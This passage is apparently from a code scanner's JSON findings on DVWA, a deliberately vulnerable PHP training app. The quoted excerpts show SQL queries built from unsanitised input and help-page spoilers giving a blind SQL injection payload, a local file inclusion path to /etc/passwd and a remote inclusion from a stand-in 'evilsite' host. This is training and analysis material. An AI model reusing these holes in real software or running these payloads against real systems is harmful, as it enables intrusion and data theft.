        "excerpt": "$DVWAOS           = &#39;Operating system: &lt;em&gt;&#39; . ( strtoupper( substr (PHP_OS, 0, 3)) === &#39;WIN&#39; ? &#39;Windows&#39; : &#39;*nix&#39; ) . &#39;&lt;/em&gt;&#39;;\n$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n",
        "startLocationLine": 574,
        "startLocationColumn": 22,
        "endLocationLine": 574,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n",
        "startLocationLine": 575,
        "startLocationColumn": 22,
        "endLocationLine": 575,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n\n",
        "startLocationLine": 576,
        "startLocationColumn": 22,
        "endLocationLine": 576,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_SERVER     = &#39;MySQL host: &lt;em&gt;&#39; . $_DVWA[ &#39;db_server&#39; ] . &#39;&lt;/em&gt;&#39;;\n// -- END (Setup Functions)\n\n?&gt;\n\n",
        "startLocationLine": 577,
        "startLocationColumn": 22,
        "endLocationLine": 577,
        "endLocationColumn": 27
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 84,
        "endLocationLine": 565,
        "endLocationColumn": 94
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 122,
        "endLocationLine": 565,
        "endLocationColumn": 132
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "$phpGD            = &#39;PHP module gd: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;gd&#39; ) &amp;&amp; function_exists( &#39;gd_info&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing - Only an issue if you want to play with captchas&#39; ) . &#39;&lt;/span&gt;&#39;;                    // File Upload\n$phpMySQL         = &#39;PHP module mysql: &lt;span class=&quot;&#39; . ( ( extension_loaded( &#39;mysqli&#39; ) &amp;&amp; function_exists( &#39;mysqli_query&#39; ) ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // Core DVWA\n$phpPDO           = &#39;PHP module pdo_mysql: &lt;span class=&quot;&#39; . ( extension_loaded( &#39;pdo_mysql&#39; ) ? &#39;success&quot;&gt;Installed&#39; : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;                // SQLi\n$DVWARecaptcha    = &#39;reCAPTCHA key: &lt;span class=&quot;&#39; . ( ( isset( $_DVWA[ &#39;recaptcha_public_key&#39; ] ) &amp;&amp; $_DVWA[ &#39;recaptcha_public_key&#39; ] != &#39;&#39; ) ? &#39;success&quot;&gt;&#39; . $_DVWA[ &#39;recaptcha_public_key&#39; ] : &#39;failure&quot;&gt;Missing&#39; ) . &#39;&lt;/span&gt;&#39;;\n\n$DVWAUploadsWrite = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPUploadPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPUploadPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                     // File Upload\n$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n",
        "startLocationLine": 565,
        "startLocationColumn": 179,
        "endLocationLine": 565,
        "endLocationColumn": 189
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\tif( isset( $_SESSION[ &#39;session_token&#39; ] ) ) {\n\t\tdestroySessionToken();\n\t}\n\t$_SESSION[ &#39;session_token&#39; ] = md5( uniqid() );\n}\n\nfunction destroySessionToken() {  # Destroy any session with the name &#39;session_token&#39;\n\tunset( $_SESSION[ &#39;session_token&#39; ] );\n}\n",
        "startLocationLine": 538,
        "startLocationColumn": 33,
        "endLocationLine": 538,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/hackable/flags/fi.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "&lt;?php\n\nif( !defined( &#39;DVWA_WEB_PAGE_TO_ROOT&#39; ) ) {\n\texit (&quot;Nice try ;-). Use the file include next time!&quot;);\n}\n\n?&gt;\n\n1.) Bond. James Bond\n",
        "startLocationLine": 4,
        "startLocationColumn": 36,
        "endLocationLine": 4,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/hackable/flags/fi.php",
        "ruleId": "AI015200",
        "ruleName": "Data: Financial (Currency)",
        "ruleDescription": "Data: Financial (Currency)",
        "pattern": "\\b(currency|usd|money|dollar|coins|euro|peso|deutsche-mark|dinar|franc|krone|pound|rupee|shekel|yen)\\b",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Data.Sensitive.Financial.Currency"
        ],
        "sample": "money",
        "excerpt": "\n?&gt;\n\n&lt;!-- 5.) The world isn&#39;t run by weapons anymore, or energy, or money. It&#39;s run by little ones and zeroes, little bits of data. It&#39;s all just electrons. --&gt;\n\n",
        "startLocationLine": 24,
        "startLocationColumn": 64,
        "endLocationLine": 24,
        "endLocationColumn": 69
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/hackable/flags/fi.php",
        "ruleId": "AI007800",
        "ruleName": "Cryptography: Encoding (Base-64)",
        "ruleDescription": "Cryptography: Encoding (Base-64)",
        "pattern": "base64",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encoding.Base64"
        ],
        "sample": "base64",
        "excerpt": "echo $line3 . &quot;\\n\\n&lt;br /&gt;&lt;br /&gt;\\n&quot;;\n\n$line4 = &quot;NC4pI&quot; . &quot;FRoZSBwb29s&quot; . &quot;IG9uIH&quot; . &quot;RoZSByb29mIG1&quot; . &quot;1c3QgaGF&quot; . &quot;2ZSBh&quot; . &quot;IGxlY&quot; . &quot;Wsu&quot;;\necho base64_decode( $line4 );\n\n?&gt;\n\n&lt;!-- 5.) The world isn&#39;t run by weapons anymore, or energy, or money. It&#39;s run by little ones and zeroes, little bits of data. It&#39;s all just electrons. --&gt;\n\n",
        "startLocationLine": 20,
        "startLocationColumn": 6,
        "endLocationLine": 20,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/help/help.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t\t&lt;h3&gt;Medium Level&lt;/h3&gt;\n\t\t&lt;p&gt;The medium level uses a form of SQL injection protection, with the function of\n\t\t\t&quot;&lt;?php echo dvwaExternalLinkUrlGet( &#39;https://secure.php.net/manual/en/function.mysql-real-escape-string.php&#39;, &#39;mysql_real_escape_string()&#39; ); ?&gt;&quot;.\n\t\t\tHowever due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.&lt;/p&gt;\n\n\t\t&lt;p&gt;The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;?id=1 AND sleep 3&amp;Submit=Submit&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 34,
        "startLocationColumn": 83,
        "endLocationLine": 34,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/high.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;",
        "excerpt": "\t$id = $_COOKIE[ &#39;id&#39; ];\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 86
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/high.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 9,
        "startLocationColumn": 96,
        "endLocationLine": 9,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/impossible.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );",
        "excerpt": "\t// Was a number entered?\n\tif(is_numeric( $id )) {\n\t\t// Check the database\n\t\t$data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );\n\t\t$data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );\n\t\t$data-&gt;execute();\n\n\t\t// Get results\n\t\tif( $data-&gt;rowCount() == 1 ) {\n",
        "startLocationLine": 13,
        "startLocationColumn": 25,
        "endLocationLine": 13,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/medium.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;",
        "excerpt": "\t$id = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $id ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 9,
        "startLocationColumn": 12,
        "endLocationLine": 9,
        "endLocationColumn": 76
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/medium.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 10,
        "startLocationColumn": 96,
        "endLocationLine": 10,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/low.php",
        "ruleId": "AI011600",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "['\\\"](select|insert|delete|update)\\s.*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;",
        "excerpt": "\t$id = $_GET[ &#39;id&#39; ];\n\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n",
        "startLocationLine": 8,
        "startLocationColumn": 12,
        "endLocationLine": 8,
        "endLocationColumn": 78
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli_blind/source/low.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\n\t// Check database\n\t$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;\n\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $getid ); // Removed &#39;or die&#39; to suppress mysql errors\n\n\t// Get results\n\t$num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors\n\tif( $num &gt; 0 ) {\n\t\t// Feedback for end user\n",
        "startLocationLine": 9,
        "startLocationColumn": 96,
        "endLocationLine": 9,
        "endLocationColumn": 101
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t\t&lt;br /&gt;&lt;hr /&gt;&lt;br /&gt;\n\n\t\t&lt;h3&gt;Low Level&lt;/h3&gt;\n\t\t&lt;p&gt;This allows for direct input into &lt;u&gt;one of many PHP functions&lt;/u&gt; that will include the content when executing.&lt;/p&gt;\n\n\t\t&lt;p&gt;Depending on the web service configuration will depend if RFI is a possibility.&lt;/p&gt;\n\t\t&lt;pre&gt;Spoiler: &lt;span class=&quot;spoiler&quot;&gt;LFI: ?page=../../../../../../etc/passwd&lt;/span&gt;.\n\t\t\tSpoiler: &lt;span class=&quot;spoiler&quot;&gt;RFI: ?page=http://www.evilsite.com/evil.php&lt;/span&gt;.&lt;/pre&gt;\n\n",
        "startLocationLine": 28,
        "startLocationColumn": 83,
        "endLocationLine": 28,
        "endLocationColumn": 123
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/fi/help/help.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
